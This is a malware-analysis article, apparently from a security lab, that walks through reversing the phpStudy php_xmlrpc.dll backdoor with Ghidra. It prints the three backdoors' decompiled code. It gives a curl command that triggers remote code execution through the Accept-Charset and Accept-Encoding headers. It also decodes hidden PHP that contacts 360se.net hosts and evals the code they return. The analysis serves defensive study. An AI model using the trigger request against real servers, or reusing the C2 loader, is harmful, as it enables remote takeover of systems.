**作者：lu4nx@知道创宇404积极防御实验室  
作者博客：[《使用 Ghidra 分析 phpStudy
后门》](https://www.shellcodes.org/Hacking/%E4%BD%BF%E7%94%A8Ghidra%E5%88%86%E6%9E%90phpStudy%E5%90%8E%E9%97%A8.html
"《使用 Ghidra 分析 phpStudy 后门》")**

这次事件已过去数日，该响应的也都响应了，虽然网上有很多厂商及组织发表了分析文章，但记载分析过程的不多，我只是想正儿八经用 Ghidra 从头到尾分析下。

## 1 工具和平台

主要工具：

  * Kali Linux
  * Ghidra 9.0.4
  * 010Editor 9.0.2

样本环境：

  * Windows7
  * phpStudy 20180211

## 2 分析过程

先在 Windows 7 虚拟机中安装 PhpStudy 20180211，然后把安装完后的目录拷贝到 Kali Linux 中。

根据网上公开的信息：后门存在于 php_xmlrpc.dll 文件中，里面存在“eval”关键字，文件 MD5 为
c339482fd2b233fb0a555b629c0ea5d5。

因此，先去找到有后门的文件：

    
    
    lu4nx@lx-kali:/tmp/phpStudy$ find ./ -name php_xmlrpc.dll -exec md5sum {} \;
    3d2c61ed73e9bb300b52a0555135f2f7  ./PHPTutorial/php/php-7.2.1-nts/ext/php_xmlrpc.dll
    7c24d796e0ae34e665adcc6a1643e132  ./PHPTutorial/php/php-7.1.13-nts/ext/php_xmlrpc.dll
    3ff4ac19000e141fef07b0af5c36a5a3  ./PHPTutorial/php/php-5.4.45-nts/ext/php_xmlrpc.dll
    c339482fd2b233fb0a555b629c0ea5d5  ./PHPTutorial/php/php-5.4.45/ext/php_xmlrpc.dll
    5db2d02c6847f4b7e8b4c93b16bc8841  ./PHPTutorial/php/php-7.0.12-nts/ext/php_xmlrpc.dll
    42701103137121d2a2afa7349c233437  ./PHPTutorial/php/php-5.3.29-nts/ext/php_xmlrpc.dll
    0f7ad38e7a9857523dfbce4bce43a9e9  ./PHPTutorial/php/php-5.2.17/ext/php_xmlrpc.dll
    149c62e8c2a1732f9f078a7d17baed00  ./PHPTutorial/php/php-5.5.38/ext/php_xmlrpc.dll
    fc118f661b45195afa02cbf9d2e57754  ./PHPTutorial/php/php-5.6.27-nts/ext/php_xmlrpc.dll

将文件 ./PHPTutorial/php/php-5.4.45/ext/php_xmlrpc.dll 单独拷贝出来，再确认下是否存在后门：

    
    
    lu4nx@lx-kali:/tmp/phpStudy$ strings ./PHPTutorial/php/php-5.4.45/ext/php_xmlrpc.dll | grep eval
    zend_eval_string
    @eval(%s('%s'));
    %s;@eval(%s('%s'));

从上面的搜索结果可以看到文件中存在三个“eval”关键字，现在用 Ghidra 载入分析。

在 Ghidra 中搜索下：菜单栏“Search” > “For
Strings”，弹出的菜单按“Search”，然后在结果过滤窗口中过滤“eval”字符串，如图：

![
](https://images.seebug.org/content/images/2019/10/cd0b4b01-b8b7-4c6d-8601-5b9f31967f1e.png-w331s)

从上方结果“Code”字段看的出这三个关键字都位于文件 Data
段中。随便选中一个（我选的“@eval(%s(‘%s’));”）并双击，跳转到地址中，然后查看哪些地方引用过这个字符串（右击，References >
Show References to Address），操作如图：

![
](https://images.seebug.org/content/images/2019/10/40fcd0a1-3ea1-481a-8285-a659ed8663aa.png-w331s)

结果如下：

![
](https://images.seebug.org/content/images/2019/10/ad4a84dd-d879-4b6a-a3b4-dec5af94eee7.png-w331s)

可看到这段数据在 PUSH 指令中被使用，应该是函数调用，双击跳转到汇编指令处，然后 Ghidra 会自动把汇编代码转成较高级的伪代码并呈现在
Decompile 窗口中：

![ ](https://images.seebug.org/content/images/2019/10/92f4b1fe-dbd8-4651-bd55-fbe237d1c0ba.png-w331s)

如果没有看到 Decompile 窗口，在菜单Window > Decompile 中打开。

在翻译后的函数 FUN_100031f0 中，我找到了前面搜索到的三个 eval 字符，说明这个函数中可能存在多个后门（当然经过完整分析后存在三个后门）。

这里插一句，Ghidra 转换高级代码能力比 IDA 的 Hex-Rays Decompiler 插件要差一些，比如 Ghidra 转换的这段代码：

    
    
    puVar8 = local_19f;
    while (iVar5 != 0) {
      iVar5 = iVar5 + -1;
      *puVar8 = 0;
      puVar8 = puVar8 + 1;
    }

在IDA中翻译得就很直观：

    
    
    memset(&v27, 0, 0xB0u);

还有对多个逻辑的判断，IDA 翻译出来是：

    
    
    if (a && b){
    ...
    }

Ghidra 翻译出来却是：

    
    
    if (a) {
      if(b) {
      }
    }

而多层 if 嵌套阅读起来会经常迷路。总之 Ghidra 翻译的代码只有反复阅读后才知道是干嘛的，在理解这类代码上我花了好几个小时。

### 2.1 第一个远程代码执行的后门

第一个后门存在于这段代码：

    
    
    iVar5 = zend_hash_find(*(int *)(*param_3 + -4 + *(int *)executor_globals_id_exref * 4) + 0xd8,
                           s__SERVER_1000ec9c,~uVar6,&local_14);
    if (iVar5 != -1) {
      uVar6 = 0xffffffff;
      pcVar9 = s_HTTP_ACCEPT_ENCODING_1000ec84;
      do {
        if (uVar6 == 0) break;
        uVar6 = uVar6 - 1;
        cVar1 = *pcVar9;
        pcVar9 = pcVar9 + 1;
      } while (cVar1 != '\0');
      iVar5 = zend_hash_find(*(undefined4 *)*local_14,s_HTTP_ACCEPT_ENCODING_1000ec84,~uVar6,&local_28
                             );
      if (iVar5 != -1) {
        pcVar9 = s_gzip,deflate_1000ec74;
        pbVar4 = *(byte **)*local_28;
        pbVar7 = pbVar4;
        do {
          bVar2 = *pbVar7;
          bVar11 = bVar2 < (byte)*pcVar9;
          if (bVar2 != *pcVar9) {
          LAB_10003303:
            iVar5 = (1 - (uint)bVar11) - (uint)(bVar11 != false);
            goto LAB_10003308;
          }
          if (bVar2 == 0) break;
          bVar2 = pbVar7[1];
          bVar11 = bVar2 < ((byte *)pcVar9)[1];
          if (bVar2 != ((byte *)pcVar9)[1]) goto LAB_10003303;
          pbVar7 = pbVar7 + 2;
          pcVar9 = (char *)((byte *)pcVar9 + 2);
        } while (bVar2 != 0);
        iVar5 = 0;
      LAB_10003308:
        if (iVar5 == 0) {
          uVar6 = 0xffffffff;
          pcVar9 = s__SERVER_1000ec9c;
          do {
            if (uVar6 == 0) break;
            uVar6 = uVar6 - 1;
            cVar1 = *pcVar9;
            pcVar9 = pcVar9 + 1;
          } while (cVar1 != '\0');
          iVar5 = zend_hash_find(*(int *)(*param_3 + -4 + *(int *)executor_globals_id_exref * 4) +
                                 0xd8,s__SERVER_1000ec9c,~uVar6,&local_14);
          if (iVar5 != -1) {
            uVar6 = 0xffffffff;
            pcVar9 = s_HTTP_ACCEPT_CHARSET_1000ec60;
            do {
              if (uVar6 == 0) break;
              uVar6 = uVar6 - 1;
              cVar1 = *pcVar9;
              pcVar9 = pcVar9 + 1;
            } while (cVar1 != '\0');
            iVar5 = zend_hash_find(*(undefined4 *)*local_14,s_HTTP_ACCEPT_CHARSET_1000ec60,~uVar6,
                                   &local_1c);
            if (iVar5 != -1) {
              uVar6 = 0xffffffff;
              pcVar9 = *(char **)*local_1c;
              do {
                if (uVar6 == 0) break;
                uVar6 = uVar6 - 1;
                cVar1 = *pcVar9;
                pcVar9 = pcVar9 + 1;
              } while (cVar1 != '\0');
              local_10 = FUN_100040b0((int)*(char **)*local_1c,~uVar6 - 1);
              if (local_10 != (undefined4 *)0x0) {
                iVar5 = *(int *)(*param_3 + -4 + *(int *)executor_globals_id_exref * 4);
                local_24 = *(undefined4 *)(iVar5 + 0x128);
                *(undefined **)(iVar5 + 0x128) = local_ec;
                iVar5 = _setjmp3(local_ec,0);
                uVar3 = local_24;
                if (iVar5 == 0) {
                  zend_eval_string(local_10,0,&DAT_10012884,param_3);
                }
                else {
                  *(undefined4 *)
                    (*(int *)(*param_3 + -4 + *(int *)executor_globals_id_exref * 4) + 0x128) =
                    local_24;
                }
                *(undefined4 *)
                  (*(int *)(*param_3 + -4 + *(int *)executor_globals_id_exref * 4) + 0x128) = uVar3;
              }
            }
          }
        }
      }
     }

阅读起来非常复杂，大概逻辑就是通过 PHP 的 `zend_hash_find` 函数寻找 `$_SERVER` 变量，然后找到 Accept-Encoding 和 Accept-Charset 两个 HTTP 请求头，如果 Accept-Encoding 的值为 gzip,deflate，就调用
`zend_eval_string` 去执行 Accept-Encoding 的内容：

    
    
    zend_eval_string(local_10,0,&DAT_10012884,param_3);

这里 zend_eval_string 执行的是 local_10 变量的内容，local_10 是通过调用一个函数赋值的：

    
    
    local_10 = FUN_100040b0((int)*(char **)*local_1c,~uVar6 - 1);

函数 FUN_100040b0 最后分析出来是做 Base64 解码的。

到这里，就知道该如何构造 Payload 了：

    
    
    Accept-Encoding: gzip,deflate
    Accept-Charset: Base64加密后的PHP代码

朝虚拟机构造一个请求：

    
    
    $ curl -H "Accept-Charset: $(echo 'system("ipconfig");' | base64)" -H 'Accept-Encoding: gzip,deflate' 192.168.128.6

结果如图：

![
](https://images.seebug.org/content/images/2019/10/41d8dd18-9c91-4943-9f40-cb5633a25fb4.png-w331s)

### 2.2 第二处后门

沿着伪代码继续分析，看到这一段代码：

    
    
    if (iVar5 == 0) {
      puVar8 = &DAT_1000d66c;
      local_8 = &DAT_10012884;
      piVar10 = &DAT_1000d66c;
    
      do {
        if (*piVar10 == 0x27) {
          (&DAT_10012884)[iVar5] = 0x5c;
          (&DAT_10012885)[iVar5] = *(undefined *)puVar8;
          iVar5 = iVar5 + 2;
          piVar10 = piVar10 + 2;
        }
        else {
          (&DAT_10012884)[iVar5] = *(undefined *)puVar8;
          iVar5 = iVar5 + 1;
          piVar10 = piVar10 + 1;
        }
        puVar8 = puVar8 + 1;
      } while ((int)puVar8 < 0x1000e5c4);
      spprintf(&local_20,0,s_$V='%s';$M='%s';_1000ec3c,&DAT_100127b8,&DAT_10012784);
      spprintf(&local_8,0,s_%s;@eval(%s('%s'));_1000ec28,local_20,s_gzuncompress_1000d018,
               local_8);
      iVar5 = *(int *)(*param_3 + -4 + *(int *)executor_globals_id_exref * 4);
      local_10 = *(undefined4 **)(iVar5 + 0x128);
      *(undefined **)(iVar5 + 0x128) = local_6c;
      iVar5 = _setjmp3(local_6c,0);
      uVar3 = local_10;
    
      if (iVar5 == 0) {
        zend_eval_string(local_8,0,&DAT_10012884,param_3);
      }
      else {
        *(undefined4 **)
          (*(int *)(*param_3 + -4 + *(int *)executor_globals_id_exref * 4) + 0x128) = local_10;
      }
      *(undefined4 *)(*(int *)(*param_3 + -4 + *(int *)executor_globals_id_exref * 4) + 0x128) =
        uVar3;
    
      return 0;
     }

重点在这段：

    
    
    puVar8 = &DAT_1000d66c;
    local_8 = &DAT_10012884;
    piVar10 = &DAT_1000d66c;
    do {
      if (*piVar10 == 0x27) {
        (&DAT_10012884)[iVar5] = 0x5c;
        (&DAT_10012885)[iVar5] = *(undefined *)puVar8;
        iVar5 = iVar5 + 2;
        piVar10 = piVar10 + 2;
      }
      else {
        (&DAT_10012884)[iVar5] = *(undefined *)puVar8;
        iVar5 = iVar5 + 1;
        piVar10 = piVar10 + 1;
      }
      puVar8 = puVar8 + 1;
     } while ((int)puVar8 < 0x1000e5c4);

变量 puVar8 是作为累计变量，这段代码像是拷贝地址 0x1000d66c 至 0x1000e5c4 之间的数据，于是选中切这行代码：

    
    
    puVar8 = &DAT_1000d66c;

双击 DAT_1000d66c，Ghidra 会自动跳转到该地址，然后在菜单选择 Window > Bytes 来打开十六进制窗口，现已处于地址
0x1000d66c，接下来要做的就是把 0x1000d66c~0x1000e5c4 之间的数据拷贝出来：

  1. 选择菜单 Select > Bytes；
  2. 弹出的窗口中勾选“To Address”，然后在右侧的“Ending Address”中填入 0x1000e5c4，如图：

![
](https://images.seebug.org/content/images/2019/10/1fbd41e5-6dc6-4ba1-b630-6e8a8939504d.png-w331s)

按回车后，这段数据已被选中，我把它们单独拷出来，点击右键，选择 Copy Special > Byte String (No Spaces)，如图：

![
](https://images.seebug.org/content/images/2019/10/aa6ce3bd-5c3c-4bad-83db-1e81b4d546ed.png-w331s)

然后打开 010Editor 编辑器：

  1. 新建文件：File > New > New Hex File；
  2. 粘贴拷贝的十六进制数据：Edit > Paste From > Paste from Hex Text

然后，把“00”字节全部去掉，选择 Search > Replace，查找 00，Replace 那里不填，点“Replace All”，处理后如下：

![
](https://images.seebug.org/content/images/2019/10/75c16b92-a593-4593-b1f2-2f3d15339823.png-w331s)

把处理后的文件保存为 p1。通过 file 命令得知文件 p1 为 Zlib 压缩后的数据：

    
    
    $ file p1
    p1: zlib compressed data

用 Python 的 zlib 库就可以解压，解压代码如下：

    
    
    import zlib
    
    with open("p1", "rb") as f:
        data = f.read()
        print(zlib.decompress(data))

执行结果如下：

    
    
    lu4nx@lx-kali:/tmp$ python3 decom.py
    b"$i='info^_^'.base64_encode($V.'<|>'.$M.'<|>').'==END==';$zzz='-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------';@eval(base64_decode('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpOwplcnJvcl9yZXBvcnRpbmcoMCk7CmZ1bmN0aW9uIHRjcEdldCgkc2VuZE1zZyA9ICcnLCAkaXAgPSAnMzYwc2UubmV0JywgJHBvcnQgPSAnMjAxMjMnKXsKCSRyZXN1bHQgPSAiIjsKICAkaGFuZGxlID0gc3RyZWFtX3NvY2tldF9jbGllbnQoInRjcDovL3skaXB9OnskcG9ydH0iLCAkZXJybm8sICRlcnJzdHIsMTApOyAKICBpZiggISRoYW5kbGUgKXsKICAgICRoYW5kbGUgPSBmc29ja29wZW4oJGlwLCBpbnR2YWwoJHBvcnQpLCAkZXJybm8sICRlcnJzdHIsIDUpOwoJaWYoICEkaGFuZGxlICl7CgkJcmV0dXJuICJlcnIiOwoJfQogIH0KICBmd3JpdGUoJGhhbmRsZSwgJHNlbmRNc2cuIlxuIik7Cgl3aGlsZSghZmVvZigkaGFuZGxlKSl7CgkJc3RyZWFtX3NldF90aW1lb3V0KCRoYW5kbGUsIDIpOwoJCSRyZXN1bHQgLj0gZnJlYWQoJGhhbmRsZSwgMTAyNCk7CgkJJGluZm8gPSBzdHJlYW1fZ2V0X21ldGFfZGF0YSgkaGFuZGxlKTsKCQlpZiAoJGluZm9bJ3RpbWVkX291dCddKSB7CgkJICBicmVhazsKCQl9CgkgfQogIGZjbG9zZSgkaGFuZGxlKTsgCiAgcmV0dXJuICRyZXN1bHQ7IAp9CgokZHMgPSBhcnJheSgid3d3IiwiYmJzIiwiY21zIiwiZG93biIsInVwIiwiZmlsZSIsImZ0cCIpOwokcHMgPSBhcnJheSgiMjAxMjMiLCI0MDEyNSIsIjgwODAiLCI4MCIsIjUzIik7CiRuID0gZmFsc2U7CmRvIHsKCSRuID0gZmFsc2U7Cglmb3JlYWNoICgkZHMgYXMgJGQpewoJCSRiID0gZmFsc2U7CgkJZm9yZWFjaCAoJHBzIGFzICRwKXsKCQkJJHJlc3VsdCA9IHRjcEdldCgkaSwkZC4iLjM2MHNlLm5ldCIsJHApOyAKCQkJaWYgKCRyZXN1bHQgIT0gImVyciIpewoJCQkJJGIgPXRydWU7CgkJCQlicmVhazsKCQkJfQoJCX0KCQlpZiAoJGIpYnJlYWs7Cgl9CgkkaW5mbyA9IGV4cGxvZGUoIjxePiIsJHJlc3VsdCk7CglpZiAoY291bnQoJGluZm8pPT00KXsKCQlpZiAoc3RycG9zKCRpbmZvWzNdLCIvKk9uZW1vcmUqLyIpICE9PSBmYWxzZSl7CgkJCSRpbmZvWzNdID0gc3RyX3JlcGxhY2UoIi8qT25lbW9yZSovIiwiIiwkaW5mb1szXSk7CgkJCSRuPXRydWU7CgkJfQoJCUBldmFsKGJhc2U2NF9kZWNvZGUoJGluZm9bM10pKTsKCX0KfXdoaWxlKCRuKTs='));"

用 base64 命令把这段 Base64 代码解密，过程及结果如下：

    
    
    lu4nx@lx-kali:/tmp$ echo 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpOwplcnJvcl9yZXBvcnRpbmcoMCk7CmZ1bmN0aW9uIHRjcEdldCgkc2VuZE1zZyA9ICcnLCAkaXAgPSAnMzYwc2UubmV0JywgJHBvcnQgPSAnMjAxMjMnKXsKCSRyZXN1bHQgPSAiIjsKICAkaGFuZGxlID0gc3RyZWFtX3NvY2tldF9jbGllbnQoInRjcDovL3skaXB9OnskcG9ydH0iLCAkZXJybm8sICRlcnJzdHIsMTApOyAKICBpZiggISRoYW5kbGUgKXsKICAgICRoYW5kbGUgPSBmc29ja29wZW4oJGlwLCBpbnR2YWwoJHBvcnQpLCAkZXJybm8sICRlcnJzdHIsIDUpOwoJaWYoICEkaGFuZGxlICl7CgkJcmV0dXJuICJlcnIiOwoJfQogIH0KICBmd3JpdGUoJGhhbmRsZSwgJHNlbmRNc2cuIlxuIik7Cgl3aGlsZSghZmVvZigkaGFuZGxlKSl7CgkJc3RyZWFtX3NldF90aW1lb3V0KCRoYW5kbGUsIDIpOwoJCSRyZXN1bHQgLj0gZnJlYWQoJGhhbmRsZSwgMTAyNCk7CgkJJGluZm8gPSBzdHJlYW1fZ2V0X21ldGFfZGF0YSgkaGFuZGxlKTsKCQlpZiAoJGluZm9bJ3RpbWVkX291dCddKSB7CgkJICBicmVhazsKCQl9CgkgfQogIGZjbG9zZSgkaGFuZGxlKTsgCiAgcmV0dXJuICRyZXN1bHQ7IAp9CgokZHMgPSBhcnJheSgid3d3IiwiYmJzIiwiY21zIiwiZG93biIsInVwIiwiZmlsZSIsImZ0cCIpOwokcHMgPSBhcnJheSgiMjAxMjMiLCI0MDEyNSIsIjgwODAiLCI4MCIsIjUzIik7CiRuID0gZmFsc2U7CmRvIHsKCSRuID0gZmFsc2U7Cglmb3JlYWNoICgkZHMgYXMgJGQpewoJCSRiID0gZmFsc2U7CgkJZm9yZWFjaCAoJHBzIGFzICRwKXsKCQkJJHJlc3VsdCA9IHRjcEdldCgkaSwkZC4iLjM2MHNlLm5ldCIsJHApOyAKCQkJaWYgKCRyZXN1bHQgIT0gImVyciIpewoJCQkJJGIgPXRydWU7CgkJCQlicmVhazsKCQkJfQoJCX0KCQlpZiAoJGIpYnJlYWs7Cgl9CgkkaW5mbyA9IGV4cGxvZGUoIjxePiIsJHJlc3VsdCk7CglpZiAoY291bnQoJGluZm8pPT00KXsKCQlpZiAoc3RycG9zKCRpbmZvWzNdLCIvKk9uZW1vcmUqLyIpICE9PSBmYWxzZSl7CgkJCSRpbmZvWzNdID0gc3RyX3JlcGxhY2UoIi8qT25lbW9yZSovIiwiIiwkaW5mb1szXSk7CgkJCSRuPXRydWU7CgkJfQoJCUBldmFsKGJhc2U2NF9kZWNvZGUoJGluZm9bM10pKTsKCX0KfXdoaWxlKCRuKTs=' | base64 -d
    @ini_set("display_errors","0");
    error_reporting(0);
    function tcpGet($sendMsg = '', $ip = '360se.net', $port = '20123'){
            $result = "";
      $handle = stream_socket_client("tcp://{$ip}:{$port}", $errno, $errstr,10);
      if( !$handle ){
        $handle = fsockopen($ip, intval($port), $errno, $errstr, 5);
            if( !$handle ){
                    return "err";
            }
      }
      fwrite($handle, $sendMsg."\n");
            while(!feof($handle)){
                    stream_set_timeout($handle, 2);
                    $result .= fread($handle, 1024);
                    $info = stream_get_meta_data($handle);
                    if ($info['timed_out']) {
                      break;
                    }
             }
      fclose($handle);
      return $result;
    }
    
    $ds = array("www","bbs","cms","down","up","file","ftp");
    $ps = array("20123","40125","8080","80","53");
    $n = false;
    do {
            $n = false;
            foreach ($ds as $d){
                    $b = false;
                    foreach ($ps as $p){
                            $result = tcpGet($i,$d.".360se.net",$p);
                            if ($result != "err"){
                                    $b =true;
                                    break;
                            }
                    }
                    if ($b)break;
            }
            $info = explode("<^>",$result);
            if (count($info)==4){
                    if (strpos($info[3],"/*Onemore*/") !== false){
                            $info[3] = str_replace("/*Onemore*/","",$info[3]);
                            $n=true;
                    }
                    @eval(base64_decode($info[3]));
            }
    }while($n);

### 2.3 第三个后门

第三个后门和第二个实现逻辑其实差不多，代码如下：

    
    
    puVar8 = &DAT_1000d028;
    local_c = &DAT_10012884;
    iVar5 = 0;
    piVar10 = &DAT_1000d028;
    
    do {
      if (*piVar10 == 0x27) {
        (&DAT_10012884)[iVar5] = 0x5c;
        (&DAT_10012885)[iVar5] = *(undefined *)puVar8;
        iVar5 = iVar5 + 2;
        piVar10 = piVar10 + 2;
      }
      else {
        (&DAT_10012884)[iVar5] = *(undefined *)puVar8;
        iVar5 = iVar5 + 1;
        piVar10 = piVar10 + 1;
      }
      puVar8 = puVar8 + 1;
     } while ((int)puVar8 < 0x1000d66c);
    
    spprintf(&local_c,0,s_@eval(%s('%s'));_1000ec14,s_gzuncompress_1000d018,&DAT_10012884);
    iVar5 = *(int *)(*param_3 + -4 + *(int *)executor_globals_id_exref * 4);
    local_18 = *(undefined4 *)(iVar5 + 0x128);
    *(undefined **)(iVar5 + 0x128) = local_ac;
    iVar5 = _setjmp3(local_ac,0);
    uVar3 = local_18;
    
    if (iVar5 == 0) {
      zend_eval_string(local_c,0,&DAT_10012884,param_3);
     }

重点在这段：

    
    
    puVar8 = &DAT_1000d028;
    local_c = &DAT_10012884;
    iVar5 = 0;
    piVar10 = &DAT_1000d028;
    
    do {
      if (*piVar10 == 0x27) {
        (&DAT_10012884)[iVar5] = 0x5c;
        (&DAT_10012885)[iVar5] = *(undefined *)puVar8;
        iVar5 = iVar5 + 2;
        piVar10 = piVar10 + 2;
      }
      else {
        (&DAT_10012884)[iVar5] = *(undefined *)puVar8;
        iVar5 = iVar5 + 1;
        piVar10 = piVar10 + 1;
      }
      puVar8 = puVar8 + 1;
     } while ((int)puVar8 < 0x1000d66c);

后门代码在地址 0x1000d028~0x1000d66c 中，提取和处理方法与第二个后门的一样。找到并提出来，如下：

    
    
    lu4nx@lx-kali:/tmp$ python3 decom.py
    b" @eval( base64_decode('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpOwplcnJvcl9yZXBvcnRpbmcoMCk7CiRoID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOwokcCA9ICRfU0VSVkVSWydTRVJWRVJfUE9SVCddOwokZnAgPSBmc29ja29wZW4oJGgsICRwLCAkZXJybm8sICRlcnJzdHIsIDUpOwppZiAoISRmcCkgewp9IGVsc2UgewoJJG91dCA9ICJHRVQgeyRfU0VSVkVSWydTQ1JJUFRfTkFNRSddfSBIVFRQLzEuMVxyXG4iOwoJJG91dCAuPSAiSG9zdDogeyRofVxyXG4iOwoJJG91dCAuPSAiQWNjZXB0LUVuY29kaW5nOiBjb21wcmVzcyxnemlwXHJcbiI7Cgkkb3V0IC49ICJDb25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIjsKIAoJZndyaXRlKCRmcCwgJG91dCk7CglmY2xvc2UoJGZwKTsKfQ=='));"

把这段Base64代码解码：

    
    
    lu4nx@lx-kali:/tmp$ echo 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpOwplcnJvcl9yZXBvcnRpbmcoMCk7CiRoID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOwokcCA9ICRfU0VSVkVSWydTRVJWRVJfUE9SVCddOwokZnAgPSBmc29ja29wZW4oJGgsICRwLCAkZXJybm8sICRlcnJzdHIsIDUpOwppZiAoISRmcCkgewp9IGVsc2UgewoJJG91dCA9ICJHRVQgeyRfU0VSVkVSWydTQ1JJUFRfTkFNRSddfSBIVFRQLzEuMVxyXG4iOwoJJG91dCAuPSAiSG9zdDogeyRofVxyXG4iOwoJJG91dCAuPSAiQWNjZXB0LUVuY29kaW5nOiBjb21wcmVzcyxnemlwXHJcbiI7Cgkkb3V0IC49ICJDb25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIjsKIAoJZndyaXRlKCRmcCwgJG91dCk7CglmY2xvc2UoJGZwKTsKfQ==' | base64 -d
    @ini_set("display_errors","0");
    error_reporting(0);
    $h = $_SERVER['HTTP_HOST'];
    $p = $_SERVER['SERVER_PORT'];
    $fp = fsockopen($h, $p, $errno, $errstr, 5);
    if (!$fp) {
    } else {
            $out = "GET {$_SERVER['SCRIPT_NAME']} HTTP/1.1\r\n";
            $out .= "Host: {$h}\r\n";
            $out .= "Accept-Encoding: compress,gzip\r\n";
            $out .= "Connection: Close\r\n\r\n";
    
            fwrite($fp, $out);
            fclose($fp);
    }

## 3 参考

  * <https://github.com/jas502n/PHPStudy-Backdoor>
  * 《phpStudy 遭黑客入侵植入后门事件披露 | 微步在线报告》
  * [《PhpStudy 后门分析》，作者：Hcamael@知道创宇 404 实验室](https://paper.seebug.org/1044/ "《PhpStudy 后门分析》，作者：Hcamael@知道创宇 404 实验室")

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1058/>

